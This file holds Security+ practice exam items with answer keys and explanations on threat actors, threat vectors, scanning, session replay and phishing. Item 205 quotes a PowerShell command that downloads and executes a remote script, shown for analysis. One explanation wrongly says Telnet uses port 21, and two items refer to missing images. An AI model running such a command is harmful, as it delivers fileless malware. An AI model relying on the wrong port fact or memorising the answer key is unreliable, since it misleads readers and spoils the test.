Objective-1,197,CH1_SEIDL,Elias has implemented an AI-based network traffic analysis tool that requires him to allow the tool to monitor his network for a period of two weeks before being put into full production. What is the most significant concern he needs to address before using the AI’s baselining capabilities?,,A. The network should be isolated to prevent outbound traffic from being added to the normal traffic patterns. ,B. Compromised or otherwise malicious machines could be added to the baseline resulting in tainted training data. ,C. Traffic patterns may not match traffic throughout a longer timeframe. ,D. The AI may not understand the traffic flows in his network. ,B,Training an artificial intelligence (AI) or machine learning (ML) system with tainted data is a significant concern. Elias needs to ensure that the traffic on his network is typical and nonmalicious to ensure that the AI does not presume that malicious traffic is normal for his network.
Objective-1,198,CH1_SEIDL,What is the typical goal intent or goal of hacktivists?,,A. Increasing their reputation ,B. Financial gain ,C. Making a political statement ,D. Gathering high-value data ,C,"The most common motivation for hacktivists is to make a political statement. Reputational gains are often associated with script kiddies, whereas financial gain is most commonly a goal of organized crime or insider threats. Gathering high-value data is typical of both nation-state actors and organized crime."
Objective-1,199,CH1_SEIDL,Where does the information for predictive analysis for threat intelligence come from?,,A. Current security trends ,B. Large security datasets ,C. Behavior patterns ,D. All of the above ,D,"Predictive analysis tools use large volumes of data, including information about security trends and threats, large security datasets from various security tools and other sources, and behavior patterns, to predict and identify malicious and suspicious behavior."
Objective-1,200,CH1_SEIDL,Social Security numbers and other personal information are often stolen for what purpose?,,A. Blackmail ,B. Tailgating ,C. Identity fraud ,D. Impersonation ,C,"Identity fraud and identity theft commonly use Social Security numbers as part of the theft of identity. Tailgating involves following a person through a security door or gate so that you do not have to present credentials or a code, whereas impersonation is a social engineering technique where you claim to be someone else. Blackmail is a potential answer, but the most common usage is for identity fraud."
Objective-1,201,CH1_SEIDL,"Security orchestration, automation, and response (SOAR) tools have three major components. Which of the following is not one of those components?",,A. Source code security analysis and testing ,B. Threat and vulnerability management ,C. Security incident response ,D. Security operations automation ,A,"SOAR tools, like security information and event management (SIEM) tools, are highly focused on security operations. They include threat and vulnerability management, security incident response, and security operations and automation tools, but they do not provide source code analysis and testing tools."
Objective-1,202,CH1_SEIDL,"Direct access, wireless, email, supply chain, social media, removable media, and cloud are all examples of what?",,A. Threat intelligence sources ,B. Threat vectors ,C. Attributes of threat actors ,D. Vulnerabilities ,B,"The Security+ exam outline specifically lists these items as threat vectors. Although there are many others, you should be familiar with direct access, wireless, email, supply chain, social media, removable media, and cloud as vectors for the exam."
Objective-1,203,CH1_SEIDL,SourceForge and GitHub are both examples of what type of threat intelligence source?,,A. The dark web ,B. Automated indicator sharing sources ,C. File or code repositories ,D. Public information sharing centers ,C,"Although it may seem strange at first, both SourceForge and GitHub are used to house sample exploit code as well as other information that threat intelligence analysts may find useful. They are not part of the dark web, nor are they an automated indicator sharing (AIS) source or a public information sharing center."
Objective-1,204,CH1_SEIDL,What is the root cause of improper input handling?,,A. Improper error handling ,B. Trusting rather than validating data inputs ,C. Lack of user awareness ,D. Improper source code review ,B,"Trusting rather than validating user input is the root cause of improper input handling. All input should be considered potentially malicious and thus treated as untrusted. Appropriate filtering, validation, and testing should be performed to ensure that only valid data input is accepted and processed."
Objective-1,205,CH1_SEIDL,Claire discovers the following PowerShell script. What does it do? powershell.exe -ep Bypass -nop -noexit -c iex ((New ObjectNet.WebClient). DownloadString('https://example.com/file.psl)),,A. Downloads a file and opens a remote shell ,B. Uploads a file and deletes the local copy ,C. Downloads a file into memory ,D. Uploads a file from memory ,C,"The code is an example of a PowerShell script that downloads a file into memory. You can rule out the upload options by reading the script since it mentions a download in the script example. Since we see a string being downloaded, rather than a file and location, you may be able to guess that this is a fileless malware example."
Objective-1,206,CH1_SEIDL,Kathleen’s IPS flags traffic from two IP addresses as shown here: \nSource IP: 10.11.94.111 \nhttp://example.com/home/show.php?SESSIONID=a3fghbby \nSource IP: 192.168.5.34 \nhttp://example.com/home/show.php?SESSIONID=a3fghbby \nWhat type of attack should she investigate this as?,,A. A SQL injection attack ,B. A cross-site scripting attack ,C. A session replay attack ,D. A server-side request forgery attack ,C,"Session IDs should be unique for distinct users and systems. A very basic type of session replay attack involves providing a victim with a session ID and then using that session ID once they have used the link and authenticated themselves. Protections such as session timeouts and encrypting session data, as well as encoding the source IP, hostname, or other identifying information in the session key, can all help prevent session replay attacks."
Objective-1,207,CH1_SEIDL,There are seven impact categories that you need to know for the Security+ exam. Which of the following is not one of them?,,A. Data breaches ,B. Data modification ,C. Data exfiltration ,D. Data loss ,B,"The Security+ exam outline lists seven major impact categories, including data loss, data breaches, and data exfiltration. Data modification is not listed, but it is a concern as part of the integrity leg of the CIA triad."
Objective-1,208,CH1_SEIDL,Which of the following research sources is typically the least timely when sourcing threat intelligence?,,A. Vulnerability feeds ,B. Local industry groups ,C. Academic journals ,D. Threat feeds ,C,"Academic journals are the slowest of the items listed because of the review processes involved with most reputable journals. Although academic journals can be useful resources, they are typically not up-to-the-minute sources. Other resources you should be aware of are vendor websites, conferences, social media, and RFCs (requests for comments)."
Objective-1,209,CH1_SEIDL,"While reviewing auth logs on a server that she maintains, Megan notices the following \nlog entries: \nApr 26 20:01:32 \nillegal port \nApr 26 20:01:48 \nillegal port \nApr 26 20:02:02 \nillegal port \nApr 26 20:02:09 \nillegal port \nApr 26 20:02:09 \nillegal port \nApr 26 20:02:35 \nillegal port \nApr 26 20:02:35 \nillegal port \n \n examplesys rshd[6101]: Connection from 10.0.2.15 on \n examplesys rshd[6117]: Connection from 10.0.2.15 on \n examplesys rshd[6167]: Connection from 10.0.2.15 on \n examplesys rshd[6170]: Connection from 10.0.2.15 on \n examplesys rshd[6172]: Connection from 10.0.2.15 on \n examplesys rshd[6188]: Connection from 10.0.2.15 on \n examplesys rlogind[6189]: Connection from 10.0.2.15 on \n \n What has she most likely detected?",,A. A successful hacking attempt ,B. A failed service startup ,C. A vulnerability scan ,D. A system reboot ,C,"Vulnerability scans and port scans can often be detected in logs by looking for a series of ports being connected to. In this case, the log was created by scanning a system with an OpenVAS scanner. There is no indication of a successful login or other hacking attempt, and a service startup would show in the messages log, not the auth log. A reboot would also show in the messages log rather than the auth log."
Objective-1,210,CH1_SEIDL,The following graphic shows a report from an OpenVAS vulnerability scan. What should Charles do first to determine the best fix for the vulnerability shown?,,A. Disable PHP-CGI. ,B. Upgrade PHP to version 5.4. ,C. Review the vulnerability descriptions in the CVEs listed. ,D. Disable the web server. ,C,"Although it may be tempting to immediately upgrade, reading and understanding the CVEs for a vulnerability is a good best practice. Once Charles understands the issue, he can then remediate it based on the recommendations for that specific problem. Disabling PHP or the web server would break the service, and in this case, only newer versions of PHP than 5.4 have the patch Charles needs."
Objective-1,211,CH1_SEIDL,"Ian runs a vulnerability scan, which notes that a service is running on TCP port 8080. What type of service is most likely running on that port?",,A. SSH ,B. RDP ,C. MySQL ,D. HTTP ,D,"Although 80 and 443 are the most common HTTP ports, it is common practice to run additional web servers on port 8080 when a nonstandard port is needed. SSH would be expected to be on port 22, RDP on 3389, and MySQL on 3306."
Objective-1,212,CH1_SEIDL,"Rick runs WPScan against a potentially vulnerable WordPress installation. WPScan is a web application security scanner designed specifically for WordPress sites. As part of the scan results, he notices the following entry:  What should Rick do after remediating this vulnerability?",,A. Install a web application firewall,B. Review the patching and updating process for the WordPress system,C. Search for other compromised systems,D. Review IPS logs for attacks against the vulnerable plug-in,B,"Once this issue is remediated, Rick should investigate why the system was running a plug-in from 2007. In many cases, when you discover a vulnerable component like this it indicates a deeper issue that exists in the organization or processes for system and application maintenance. Installing a web application firewall (WAF) or reviewing intrusion prevention system (IPS) logs may be useful if Rick thinks there are ongoing attacks or that successful attacks have occurred, but the problem does not state anything about that. There is no indication of compromise, merely a completely outdated plug-in version in the problem. If you want a sample system with vulnerable plug-ins like this to test, you can download the 2015 release of the Open Web Application Security Project (OWASP) broken web applications virtual machine. It has a wide range of completely out-of-date applications and services to practice against."
Objective-1,213,CH1_SEIDL,Carolyn runs a vulnerability scan of a network device and discovers that the device is running services on TCP ports 22 and 443. What services has she most likely discovered?,,A. Telnet and a web server ,B. FTP and a Windows fileshare ,C. SSH and a web server ,D. SSH and a Windows fileshare ,C,"A network device running SSH and a web server on TCP port 443 is a very typical discovery when running a vulnerability scan. Without any demonstrated issues, Carolyn should simply note that she saw those services. Telnet runs on port 21, an unencrypted web server will run on TCP 80 in most cases, and Windows fileshares use a variety of ports including TCP ports 135–139 and 445."
Objective-1,214,CH1_SEIDL,"Ryan needs to verify that no unnecessary ports and services are available on his systems, but he cannot run a vulnerability scanner. What is his best option?",,A. Passive network traffic capture to detect services ,B. A configuration review ,C. Active network traffic capture to detect services ,D. Log review ,B,"Configuration reviews, either using automated tool or manual validation, can be a useful proactive way to ensure that unnecessary ports and services are not accessible. Configuration management tools can also help ensure that expected configurations are in place.  Neither passive nor active network packet capture will show services that are not accessed, meaning that open ports could be missed, and log review won’t show all open ports either."
Objective-1,215,CH1_SEIDL,Why is improper error handling for web applications that results in displaying error messages considered a vulnerability that should be remediated?,,A. Errors can be used to crash the system. ,B. Many errors result in race conditions that can be exploited. ,C. Many errors provide information about the host system or its configuration. ,D. Errors can change system permissions. ,C,Errors are considered a vulnerability because they often provide additional details about the system or its configuration. They typically cannot be used to directly exploit or crash the system.
Objective-1,216,CH1_SEIDL,"Some users on your network use Acme Bank for their personal banking. Those users have all recently been the victim of an attack, in which they visited a fake Acme Bank website and their logins were compromised. They all visited the bank website from your network, and all of them insist they typed in the correct URL. What is the most likely explanation for this situation?",,A. Trojan horse ,B. IP spoofing ,C. Clickjacking ,D. DNS poisoning ,D,"This appears to be a situation where your network’s DNS server is compromised and sending people to a fake site. A Trojan horse is malware tied to a legitimate program. IP spoofing would be using a fake IP address, but that is not described in this scenario. In fact, the users are not even typing in IP addresses—they are typing in URLs. Clickjacking involves tricking users into clicking something other than what they intended."
Objective-1,217,CH1_SEIDL,John is a network administrator for Acme Company. He has discovered that someone has registered a domain name that is spelled just one letter different than his company’s domain. The website with the misspelled URL is a phishing site. What best describes this attack?,,A. Session hijacking ,B. Cross-site request forgery ,C. Typo squatting ,D. Clickjacking,C,"This is a classic example of typo squatting. The website is off by only one or two letters; the attacker hopes that users of the real website mistype the URL and are taken to their fake website. Session hijacking is taking over an authenticated session. Cross-site request forgery sends fake requests to a website that purport to be from a trusted, authenticated user. Clickjacking attempts to trick users into clicking on something other than what they intended."
